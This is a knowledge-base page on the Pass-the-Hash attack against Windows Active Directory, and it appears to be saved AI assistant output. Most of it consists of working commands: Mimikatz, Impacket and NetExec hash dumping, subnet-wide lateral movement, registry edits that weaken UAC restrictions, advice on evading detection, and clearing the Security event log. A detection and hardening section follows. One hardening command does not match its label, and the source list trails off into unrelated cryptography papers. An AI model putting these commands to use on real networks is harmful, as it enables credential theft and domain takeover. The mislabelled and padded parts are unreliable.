---
title: "Attack #4 — Pass-the-Hash (PtH)"
description: "Pass-the-Hash is a credential replay attack that exploits a fundamental design characteristic of the NTLM authentication protocol. When Windows…"
category: active-directory
tags: ["active-directory", "ntlm", "hashing"]
tools: ["NetExec", "Impacket", "Mimikatz", "Rubeus", "Hashcat"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-One/🔴 Attack #4 — Pass-the-Hash (PtH).md"
---
# 🔴 Attack #4 — Pass-the-Hash (PtH)

***

## 📖 How It Works

Pass-the-Hash is a **credential replay attack** that exploits a fundamental design characteristic of the NTLM authentication protocol. When Windows authenticates a user, it never actually transmits the plaintext password — instead it uses the **NT hash** (MD4 of the Unicode password) directly in the NTLM challenge-response handshake. This means that possessing the hash is **cryptographically equivalent to possessing the password** — no cracking required.

The attacker first compromises any Windows host, dumps NTLM hashes from LSASS memory or the SAM database, then **injects that hash directly into a new authentication context** and authenticates to remote systems as the victim user. Because the remote system has no way to distinguish a hash supplied by the legitimate user from one supplied by an attacker, access is granted immediately. The attack has existed since 1997 and has **no CVE and no patch** — it is a consequence of how NTLM was designed.

> ⚠️ **Windows Server 2022+ Behaviour / Credential Guard Impact:** Modern Windows 10/11 and Server 2022+ with Credential Guard enabled **completely block LSASS hash extraction**. Mimikatz will fail with `ERROR kuhl_m_sekurlsa_getHandle` when trying to access LSASS on Credential Guard-protected systems. However, PtH still works perfectly if you already have the hash from another source (SAM, NTDS.dit, or another non-Credential-Guard host). LSA protection (RunAsPPL) also blocks LSASS access but is less comprehensive than Credential Guard. Remote Credential Guard on Server 2016+ blocks PtH over WinRM (5985), but SMB (445) and RDP (3389) may still work depending on registry configuration.

**Chains with:** Attack #3 (AS-REP roasting recovers passwords which you then hash to PtH), Attack #5 (PtH + Kerberos = Overpass-the-Hash), Attack #7 (NTLM relay to capture hashes)

### The Full Attack Flow

```
1. Gain initial foothold on any Windows machine (phishing, exploit, etc.)
2. Escalate to local admin / SYSTEM on that machine
3. Dump NTLM hashes from:
   - LSASS process memory (sekurlsa::logonpasswords via Mimikatz)
   - SAM database (reg save + secretsdump)
   - NTDS.dit (domain-wide dump from DC)
4. Identify high-value hash (Domain Admin, local admin reuse, service account)
5. Inject hash into new authentication session (Mimikatz / impacket / NetExec)
6. Authenticate to remote systems as victim — lateral movement achieved
7. Repeat: dump new hashes from each compromised host, escalate further
```

### NTLM Hash Formats — Know Your Targets

| Format | Example | Notes |
|---|---|---|
| **NT hash only** | `aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c` | Most common — LM:NT format |
| **LM hash** | `aad3b435b51404eeaad3b435b51404ee` | Effectively blank — LM disabled by default since Vista |
| **NT hash only** | `8846f7eaee8fb117ad06bdd830b7586c` | The part that matters — right side of the colon |
| **NTLM relay capture** | Full Net-NTLMv1/v2 | **Cannot** be used for PtH directly — must be relayed or cracked |

> ⚠️ **Critical distinction:** You **can** Pass-the-Hash with the **NT hash** (from LSASS/SAM/NTDS). You **cannot** Pass-the-Hash with a **Net-NTLMv2** hash captured from Responder — those must be cracked or relayed (see Attack #7).

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Local admin / SYSTEM on a host** | Required to dump LSASS or access SAM — standard user cannot read these |
| **NTLM authentication enabled** | Target must accept NTLM — if Kerberos-only is enforced, use Overpass-the-Hash instead |
| **Network access to target** | Ports 445 (SMB), 135 (RPC), 5985 (WinRM) depending on tool |
| **Target has same credentials** | Hash must be valid on the remote system (domain account or local admin reuse) |
| **UAC remote restrictions** | Local admin PtH blocked by `LocalAccountTokenFilterPolicy` unless the built-in RID-500 admin account is used |

***

## 🛠️ Tools

| Tool | Platform | Protocol | Notes |
|---|---|---|---|
| **Mimikatz** | Windows | NTLM | Gold standard; `sekurlsa::pth` spawns a new process with injected hash |
| **Impacket suite** | Linux | SMB/RPC | `psexec.py`, `smbexec.py`, `wmiexec.py` all support `-hashes` flag |
| **NetExec / CrackMapExec** | Linux | SMB/WinRM/LDAP | Best for mass lateral movement across subnets |
| **Evil-WinRM** | Linux | WinRM (5985) | Clean interactive shell via PtH over WinRM |
| **xfreerdp** | Linux | RDP (3389) | PtH over RDP with Restricted Admin Mode enabled |
| **Metasploit** | Both | SMB | `exploit/windows/smb/psexec` + `pass_the_hash` module |
| **pth-winexe / pth-smbclient** | Linux | SMB | Legacy Kali tools; still effective for quick access |
| **lsassy.py** | Linux | Network-based | Remotely extracts hashes from LSASS without local admin shell |

***

## 💻 Full Commands

### 🔵 Step 0 — Dump NTLM Hashes (Hash Acquisition Phase)

```powershell
# ── Mimikatz on compromised Windows host ──────────────────────────────────────

# Dump all credentials from LSASS memory (requires local admin)
privilege::debug
sekurlsa::logonpasswords

# Dump only NTLM hashes (faster, less noise)
sekurlsa::msv

# Dump SAM database (local account hashes — works offline too)
token::elevate
lsadump::sam

# Dump domain hashes via DCSync (if you have replication rights)
lsadump::dcsync /domain:corp.local /user:Administrator
lsadump::dcsync /domain:corp.local /all /csv
```

```bash
# ── Linux — remote SAM/NTDS dump via Impacket ─────────────────────────────────

# Dump SAM from remote machine (requires local admin creds or hash)
secretsdump.py corp.local/Administrator:'Password1'@10.10.10.10

# Dump using existing NT hash (PtH to get more hashes)
secretsdump.py corp.local/Administrator@10.10.10.10 -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

# Dump all domain hashes from DC (NTDS.dit via VSS)
secretsdump.py corp.local/Administrator:'Password1'@10.10.10.10 -just-dc-ntlm

# Output to file
secretsdump.py corp.local/Administrator@10.10.10.10 -hashes :8846f7eaee8fb117ad06bdd830b7586c -outputfile domain_hashes
```

***

### 🔴 Mimikatz — Pass-the-Hash (Windows, Spawn New Process)

```powershell
# Classic PtH — spawns cmd.exe as target user with injected hash
# (Opens a new window authenticated as that user)
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c

# PtH with specific program (e.g., PowerShell)
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:powershell.exe

# PtH for local admin (use local machine name instead of domain)
sekurlsa::pth /user:Administrator /domain:WORKSTATION01 /ntlm:8846f7eaee8fb117ad06bdd830b7586c

# Then from the spawned shell — verify access and move laterally
dir \\10.10.10.20\C$
Enter-PSSession -ComputerName 10.10.10.20
```

***

### 🔴 Impacket — Linux (Most Versatile Toolkit)

```bash
# ── psexec.py — SMB exec, spawns SYSTEM shell ─────────────────────────────────
psexec.py corp.local/Administrator@10.10.10.10 -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

# NT hash only (left side can be blank or aad3b... placeholder)
psexec.py Administrator@10.10.10.10 -hashes :8846f7eaee8fb117ad06bdd830b7586c

# ── smbexec.py — no binary drop on disk (stealthier than psexec) ──────────────
smbexec.py corp.local/Administrator@10.10.10.10 -hashes :8846f7eaee8fb117ad06bdd830b7586c

# ── wmiexec.py — WMI-based execution (no service creation) ───────────────────
wmiexec.py corp.local/Administrator@10.10.10.10 -hashes :8846f7eaee8fb117ad06bdd830b7586c

# ── atexec.py — Task Scheduler execution (avoids SMB pipe artifacts) ─────────
atexec.py corp.local/Administrator@10.10.10.10 -hashes :8846f7eaee8fb117ad06bdd830b7586c whoami

# ── smbclient.py — browse file shares as target user ─────────────────────────
smbclient.py corp.local/Administrator@10.10.10.10 -hashes :8846f7eaee8fb117ad06bdd830b7586c
```

***

### 🔴 NetExec / CrackMapExec — Linux (Mass Lateral Movement)

```bash
# Single target PtH via SMB
nxc smb 10.10.10.10 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c

# Full hash format (LM:NT)
nxc smb 10.10.10.10 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

# Subnet sweep — find all machines where hash is valid local admin
nxc smb 10.10.10.0/24 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c --local-auth

# Domain-wide sweep
nxc smb 10.10.10.0/24 -u corp_admin -H 8846f7eaee8fb117ad06bdd830b7586c

# Execute a command on all matching hosts
nxc smb 10.10.10.0/24 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c -x whoami

# Dump SAM from all compromised hosts in one sweep
nxc smb 10.10.10.0/24 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c --sam

# Dump LSA secrets (service account creds, DPAPI keys)
nxc smb 10.10.10.0/24 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c --lsa

# WinRM PtH (port 5985) — interactive shell
nxc winrm 10.10.10.10 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c
```

***

### 🔴 Evil-WinRM — Linux (Clean Interactive Shell)

```bash
# PtH over WinRM — gives a clean PowerShell-like shell
evil-winrm -i 10.10.10.10 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c

# With domain specified
evil-winrm -i 10.10.10.10 -u corp.local\\Administrator -H 8846f7eaee8fb117ad06bdd830b7586c

# Load PowerShell scripts on connect
evil-winrm -i 10.10.10.10 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c \
  -s /opt/PowerSploit/Privesc/
```

***

### 🔴 xfreerdp — RDP via Pass-the-Hash (Restricted Admin Mode)

```bash
# PtH over RDP — requires Restricted Admin Mode enabled on target
# (enabled by default on Server 2012R2+, or manually via registry key)
xfreerdp /v:10.10.10.10 /u:Administrator /pth:8846f7eaee8fb117ad06bdd830b7586c /d:corp.local +compression /dynamic-resolution

# Enable Restricted Admin Mode on target first (if you have access via another method)
# (Run on target machine)
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

***

### 🔴 lsassy.py — Remote LSASS Credential Extraction (No Shell Required)

```bash
# Extract hashes directly from remote LSASS without interactive shell
lsassy 10.10.10.10 -u low_user -p 'Password1'

# Using existing hash (PtH into LSASS extraction)
lsassy 10.10.10.10 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c

# Dump to file for batch processing
lsassy 10.10.10.10 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c -o hashes_from_remote.txt

# Note: lsassy bypasses LSASS access restrictions in some cases by using DCSync-like RPC calls
```

***

### 🔴 UAC & LocalAccountTokenFilterPolicy — Handling PtH Blocks

```bash
# By default, non-RID500 local admins are blocked from PtH via SMB
# (UAC remote restriction — Token Filtering Policy)

# Fix 1 — Enable LocalAccountTokenFilterPolicy on target (if you have a shell)
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System \
  /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

# Fix 2 — Use the built-in RID-500 Administrator account (not subject to UAC filtering)
# The built-in Administrator (SID ending in -500) bypasses this restriction automatically

# Fix 3 — Use domain accounts instead of local accounts
# Domain admin accounts are never subject to UAC remote filtering
```

***

### 🔴 Credential Guard Bypass Attempts (Note: Most Don't Work)

```bash
# ⚠️ IMPORTANT: These attempts are mostly ineffective against modern Credential Guard
# They are listed for awareness and educational purposes only

# Attempt 1 — Use lsassy with Direct Approach (limited success)
lsassy -t wdigest 10.10.10.10 -u low_user -p 'Password1'
# Result: May fail with "Failed to get handle on LSASS" if Credential Guard is active

# Attempt 2 — Dump via ntlmrelayx (relay attack, not direct extraction)
# This works against NTLM relay targets, NOT against Credential Guard itself
ntlmrelayx.py -t smb://10.10.10.10

# Attempt 3 — Use PtH with Kerberos (Overpass-the-Hash) instead
# If target allows Kerberos, convert NT hash → TGT and bypass NTLM entirely (see Attack #5)
Rubeus.exe asktgt /user:Administrator /domain:corp.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c /outfile:ticket.kirbi

# NOTE: No direct bypass for Credential Guard exists. Mitigations:
# - Use already-compromised pre-Credential-Guard hosts as pivot points
# - Perform DCSync if you have replication rights (domain-level, not LSASS)
# - Target systems that don't have Credential Guard enabled (older workstations)
```

***

## 🧩 Troubleshooting

| Error | Cause | Fix |
|---|---|---|
| **`STATUS_LOGON_FAILURE` / `STATUS_ACCESS_DENIED`** | Hash is invalid for this user or wrong domain. | Verify the hash is correct. Check spelling of username and domain. Try hash on a different target where you know it's valid (test with SAM first). |
| **`ERROR kuhl_m_sekurlsa_getHandle: 0x00000005`** | Credential Guard enabled on target; cannot access LSASS. | Credential Guard is active and blocks LSASS extraction. Use hashes from another source (SAM, NTDS, or a non-Credential-Guard host) to PtH into this system instead. Or pivot to Overpass-the-Hash (Kerberos). |
| **`LSA Protection (RunAsPPL) prevented LSASS access`** | Process Protection Light is enabled, blocking Mimikatz. | Switch to secretsdump via SMB instead: `secretsdump.py corp.local/admin@target -hashes :hash`. Or use lsassy for remote extraction. |
| **`Access denied / UAC remote restriction`** | LocalAccountTokenFilterPolicy blocks local admin PtH. | Use the built-in RID-500 Administrator account instead of a custom local admin. Or set `LocalAccountTokenFilterPolicy=1` on target (requires shell first). Domain accounts bypass this. |
| **`Restricted Admin Mode not enabled on RDP target`** | xfreerdp PtH requires Restricted Admin Mode. | Enable on target: `reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0x0`. Or use SMB/WinRM instead of RDP. |
| **`No such file or directory: secretsdump.py`** | Impacket not installed or path incorrect. | Install: `pip install impacket --upgrade`. Check Python PATH: `which secretsdump.py`. |
| **`Socket timeout / Connection refused on port 445`** | SMB port filtered or host offline. | Check connectivity: `nc -zv 10.10.10.10 445`. Verify host is online. Check firewall rules. Try different access method (WinRM on 5985, RDP on 3389). |
| **`NTLM relay hash captured from Responder (Net-NTLMv2)`** | You have a relay hash, not an NT hash — PtH won't work directly. | Crack the hash first: `hashcat -m 5600 relay_hash.txt rockyou.txt`. Or relay it (NTLM relay, Attack #7). PtH requires NT hashes only. |
| **`WinRM (5985) authentication fails but SMB (445) works`** | Remote Credential Guard may be blocking WinRM. | Remote Credential Guard blocks PtH over WinRM (5985) on Server 2016+. Use SMB (445) instead with `psexec.py`, `smbexec.py`, or `nxc smb`. |

***

## 🎯 OPSEC Tips

### OpSec Ranking (Stealthiest to Loudest)

1. **`wmiexec.py` over single host** (stealthiest) — WMI, no service creation, minimal artifacts
2. **`atexec.py` for single commands** — Task Scheduler, fast cleanup, low footprint
3. **`smbexec.py` for shell** — SMB service, no binary drop, moderate artifacts
4. **Mimikatz local PtH (interactive)** — Process injection, visible process list
5. **`psexec.py` spray across subnet** (loudest) — Service binary drop, obvious SMB activity, mass 4688 events

### Modern Defence Impact

- **Credential Guard** — blocks LSASS hash extraction entirely. Dumping becomes impossible from that host, but PtH still works using pre-dumped hashes.
- **SMB Signing + Enforcement** — if enabled, some attacks are blocked. Kerberos PtH (Overpass-the-Hash) becomes necessary.
- **Windows Defender + Sysmon** — Mimikatz binary execution is often caught. In-memory LOLBins or living-off-the-land techniques avoid this.
- **Network segmentation** — if properly configured, lateral movement is blocked even with valid hashes.

### Opsec Best Practices

- **`wmiexec.py` over `psexec.py`** — psexec creates a service and drops a binary to disk; wmiexec uses WMI and leaves significantly fewer artefacts
- **`smbexec.py`** — runs commands via SMB service creation but never writes a binary; good middle ground
- **Prefer `atexec.py`** for single command execution — uses Task Scheduler, minimal footprint
- **Don't spray hashes across the entire subnet** unless necessary — multiple 4624 Type 3 events from one source IP is a clear detection signal
- **Use domain admin hashes carefully** — authentication events from a DA account hitting multiple systems simultaneously triggers most modern SIEMs
- **Target local admin reuse first** — a recycled local admin hash across 50 workstations is gold for lateral movement with less scrutiny than DA activity
- **Clear event logs after PtH** if persistence isn't the goal: `wevtutil cl Security` (noisy, but useful)

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4624** | Security Log | Successful logon — **Logon Type 3** (network) with **NtLmSsp** as authentication package |
| **4624** | Security Log | Type 9 logon (NewCredentials) — Mimikatz `sekurlsa::pth` spawns this |
| **4648** | Security Log | Logon with explicit credentials — attacker injecting hash to remote system |
| **4672** | Security Log | Special privileges assigned to new logon (DA/local admin access) |
| **4776** | Security Log | DC attempted to validate NTLM credentials — `Status 0x0` = success |
| **7045** | System Log | New service installed — `psexec.py` creates a service; look for random-name binaries |
| **Sysmon EID 1** | Sysmon | Process creation — `lsass.exe` being accessed by non-system processes |
| **Sysmon EID 10** | Sysmon | `ProcessAccess` — Mimikatz opens LSASS with `PROCESS_VM_READ` access |

**Primary detection signature:** Event 4624 with `LogonType: 3`, `AuthenticationPackage: NTLM`, and `WorkstationName` / `IpAddress` pointing to a machine where that user has no business authenticating from. Sysmon Event 10 for LSASS access is the earliest indicator — catching the dump phase before the pass even occurs.

### Additional Sysmon Event IDs

| Event ID | Detection |
|---|---|
| **Sysmon 8** | CreateRemoteThread into process (hash injection by Mimikatz) |
| **Sysmon 11** | File creation on target system (binary drop from psexec or service binary) |
| **Sysmon 17** | PipeCreated (SMB pipes for service execution) |
| **Sysmon 18** | PipeConnected (attacker connecting to named pipes) |

### Sigma Rule References

- **Sigma rule:** `credential_access_ntlm_relay_ntlmssp` — detects NTLM authentication from unusual sources
- **Sigma rule:** `lateral_movement_remote_services` — monitors for WMI/SMB lateral movement patterns
- **Sigma rule:** `privilege_escalation_local_admin_check` — flags sudden admin access from non-admin accounts
- Link: https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_pass_the_hash.yml

### EDR Detections

- **Microsoft Defender for Identity:** Pass-the-Hash detection (abnormal logon type + NTLM from unexpected source) — flags hash-based auth
- **CrowdStrike Falcon:** Detects Mimikatz via behavioral heuristics (LSASS access + credential dumping pattern)
- **Elastic Security:** Hunt rule `credential_access_pass_the_hash_ntlm` — correlates LSASS access + NTLM logon
- **Sysmon + SIEM correlations:** Sysmon 10 (LSASS access) followed by 4624 Type 3 logon = PtH in progress

### Hardening Commands

```powershell
# Disable NTLM across domain (force Kerberos-only — breaks backward compat)
# (Domain-wide GPO setting)
Set-GPRegistryValue -Name "Default Domain Policy" \
  -Key "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" \
  -ValueName "RestrictAnonymous" -Type DWord -Value 2

# Enable Credential Guard (prevents LSASS hash extraction)
# Server 2016+ / Win10+ with TPM 2.0
Invoke-CimMethod -ClassName Win32_DeviceGuard -MethodName Enable -Arguments @{HypervisorManagedCodeIntegrityEnforcementPolicy = 1}

# Enable LSA Protection (RunAsPPL — blocks LSASS direct access)
# Windows 8.1+ / Server 2012 R2+
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 1 /f

# Enforce SMB Signing (blocks some NTLM relay attacks)
# (GPO path: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies)
Set-SmbServerConfiguration -RequireSecuritySignature $true -Force

# Monitor for LSASS access attempts
# (Enable advanced audit policy)
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable

# Disable WDIGEST (removes cleartext password from LSASS)
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
```

***

## 🗺️ MITRE ATT&CK

| Tactic | Technique ID | Sub-technique | Observed in | Platforms | Data Sources |
|---|---|---|---|---|---|
| Lateral Movement | T1550 | **002** (PtH) | APT1, APT28, Wizard Spider, FIN7, Carbanak | Windows | Authentication logs (4624, 4776), Sysmon EID 10 (Process Access), Network traffic (SMB/RPC) |

**T1550.002 — Use Alternate Authentication Material: Pass the Hash** — Leverages NTLM hash to authenticate without plaintext password. Works on all Windows versions supporting NTLM (which is all of them, for backward compatibility).

***

## 🔗 Attack Chain Context

```
[Pass-the-Hash] ──→ Authenticated Session on Remote Host as Victim User
         │
         ├──→ 🔍 Dump LSASS on new host → more hashes → repeat loop
         ├──→ 🎫 Overpass-the-Hash (convert NT hash → Kerberos TGT)
         ├──→ 🩸 DCSync (if DA hash obtained → dump all domain hashes)
         ├──→ 🎫 Golden Ticket (KRBTGT hash from DCSync → permanent persistence)
         ├──→ 📁 Access file shares, databases, email as privileged user
         └──→ 🎯 Find DA cached logon on compromised workstation → instant DA
```

**The lateral movement loop:** Compromise host → dump hashes → PtH to next host → find higher-privilege hash → repeat until Domain Admin is reached. In a flat network without segmentation, this loop can take **under 10 minutes** from first workstation compromise to Domain Admin. The technique works on any Windows version and requires no exploits — just valid hashes and network access.

***

> ✅ **Attack #4 — Pass-the-Hash complete.** Tell me to move on when you're ready for **Attack #5 — Pass-the-Ticket (PtT)**.

Sources
 What is a Pass-the-Hash Attack? | CrowdStrike https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/pass-the-hash-attack/
 What is a Pass-the-Hash Attack (PtH)? | BeyondTrust https://www.beyondtrust.com/resources/glossary/pass-the-hash-pth-attack
 What is Pass-the-Hash? Attacks Types and Security Best Practices https://www.vaadata.com/blog/what-is-pass-the-hash-attacks-types-and-security-best-practices/
 What are Pass-the-Hash (PtH) & Pass-the-Ticket (PtT)? https://www.sentinelone.com/cybersecurity-101/threat-intelligence/what-are-pass-the-hash-pth-pass-the-ticket-ptt/
 Active Directory Attacks: Pass-the-Hash, Pass-the-Ticket & Qualys ETM ... https://blog.qualys.com/product-tech/2026/02/11/qualys-etm-detect-pass-the-hash-pass-the-ticket-attacks
 Understanding Pass-the-Hash: How Attackers Exploit https://www.hedgehogsecurity.co.uk/blog/understanding-pass-the-hash-attack-how-hackers-exploit-password-vulnerabilities
 Detecting Pass-the-Hash Attack in a Microsoft Active Directory Environment using an Open-Source Approach https://ieeexplore.ieee.org/document/10795633/
 An Open-Source Approach to Detect Pass-the-Hash Attack in Active Directory Using Wazuh and Sysmon https://link.springer.com/10.1134/S0361768825700483
 Pass the Hash Attack Defense | AD Security 101 https://www.semperis.com/blog/how-to-defend-against-pass-the-hash-attack/
 Pass the hash - Wikipedia https://en.wikipedia.org/wiki/Pass_the_hash
 What Is a Pass the Hash Attack? | Proofpoint USwww.proofpoint.com › threat-reference › pass-the-hash https://www.proofpoint.com/us/threat-reference/pass-the-hash
 An Expert Guide to Mitigating Pass-the-Hash Attacks in Active Directory https://www.nccgroup.com/research/defending-your-directory-an-expert-guide-to-mitigating-pass-the-hash-attacks-in-active-directory/
 What is a Pass-the-Hash Attack (PtH)? PtH Explained https://www.xcitium.com/knowledge-base/pth/
 Threat overview https://www.semperis.com/blog/pass-the-hash-attack-explained/
 Identifying and Preventing... https://www.strongdm.com/what-is/pass-the-hash-attack-pth
 Pass the Hash: Mechanics and Mitigation https://nordpass.com/blog/pass-the-hash-attack/
 Pass the Hash and Credential Theft https://download.microsoft.com/download/C/5/7/C57FB17E-620C-46AD-BC3E-4A8064273669/Aaron_Margosis_Pass_the_hash.pdf
 Pass-the-Hash in Windows 10 GIAC ( GCIH ) Gold Certification https://www.semanticscholar.org/paper/ca3bdcf7802e8d834f52845a0eb3b953111971f5
 Pass-the-Hash in Windows 10 https://www.semanticscholar.org/paper/59c5ac8c084e13433f4d56703dee90eb25736194
 Pass-the-Hash: One of the Most Prevalent Yet Underrated Attacks for Credentials Theft and Reuse https://dl.acm.org/doi/10.1145/3134302.3134338
 Defeating Pass-the-Hash Separation of Powers https://www.semanticscholar.org/paper/a6ffa297b6c915f3056c207c55f9a99f299350e2
 Improved Preimage Attack on 3-Pass HAVAL https://www.semanticscholar.org/paper/e33983337beb98d51dbab233206d8d1a9243bf0a
 Improved preimage attack on 3-pass HAVAL http://link.springer.com/10.1007/s12204-011-1215-3
 Enhanced Multi-Chaotic Fredkin-Logic-Based Image Encryption for Satellite Imagery with Adaptive Hash-Driven Key Generation https://bajest.bauc14.edu.iq/index.php/bajest/article/view/179
 Some Cryptanalytic Results on Zipper Hash and Concatenated Hash https://www.semanticscholar.org/paper/9637504875342b0467aada6de710346971270459
 PTHash: Revisiting FCH Minimal Perfect Hashing http://arxiv.org/pdf/2104.10402.pdf
 Recovering cryptographic keys from partial information, by example https://cic.iacr.org/p/1/1/28/pdf
 CASH: A Cost Asymmetric Secure Hash Algorithm for Optimal Password Protection http://arxiv.org/pdf/1509.00239.pdf
 The Spy in the Sandbox -- Practical Cache Attacks in Javascript http://arxiv.org/pdf/1502.07373v2.pdf
 Exploiting Leakage in Password Managers via Injection Attacks http://arxiv.org/pdf/2408.07054.pdf
 Cost-Asymmetric Memory Hard Password Hashing http://arxiv.org/pdf/2206.12970.pdf
 Passive SSH Key Compromise via Lattices https://dl.acm.org/doi/pdf/10.1145/3576915.3616629
 Covert Channels in One-Time Passwords Based on Hash Chains https://zenodo.org/record/5999651/files/EICC_2020_Poster.pdf
